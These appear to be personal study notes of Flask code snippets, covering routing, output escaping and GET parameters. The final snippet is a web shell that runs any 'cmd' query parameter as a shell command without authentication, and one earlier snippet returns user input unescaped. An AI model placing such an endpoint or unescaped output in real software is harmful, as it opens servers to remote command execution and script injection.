#### > Hello Word

```
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
	return 'Index Page'

@app.route('/hello')
def hello():
	return 'Hello, World'
```

#### > Escape

```
from markupsafe import escape

@app.route("/<name>")
def hello(name):
    return f"Hello, {escape(name)}!"
```

#### > GET Method

```
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
	name = request.args.get('name')
	return name
```

#### > Shell Execute from GET Method

```
import subprocess
from flask import Flask, request

app = Flask(__name__)

def run_command(command):
	return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/')
def index():
	cmd = request.args.get('cmd')
	return run_command(cmd)
```
